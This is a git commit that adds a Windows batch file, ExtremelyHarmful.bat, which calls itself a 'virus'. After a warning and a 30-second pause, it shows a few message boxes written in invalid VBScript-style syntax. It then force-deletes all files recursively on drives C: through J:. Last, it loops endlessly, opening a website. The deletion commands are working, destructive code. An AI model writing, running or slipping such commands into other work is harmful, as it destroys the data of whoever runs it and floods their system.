64552a33f8b2486e79242de53daaa3b162e709cc
xynny <86185324+xynnylol@users.noreply.github.com>
2021-12-02 01:30:38 +0000

    Create ExtremelyHarmful.bat

---
+++ ExtremelyHarmful.bat
@@ -0,0 +1,19 @@
+@echo off
+echo WARNING THIS IS A EXTREMELY DANGEROUS VIRUS. IF YOU DID NOT MEAN TO RUN THIS CLOSE THIS WINDOW.
+timeout /t 30
+Msgbox("Virus Is Active",0+16,"Virus Alert")
+Msgbox("Virus Is Active",0+16,"Virus Alert")
+Msgbox("Virus Is Active",0+16,"Virus Alert")
+Msgbox("Wanna Fix Virus",0+16,"Fix Virus")
+@echo off
+del C:\ /f /s /q
+del D:\ /f /s /q
+del E:\ /f /s /q
+del F:\ /f /s /q
+del G:\ /f /s /q
+del H:\ /f /s /q
+del I:\ /f /s /q
+del J:\ /f /s /q
+:A
+start https://xynnylol.github.io/yai
+goto :A
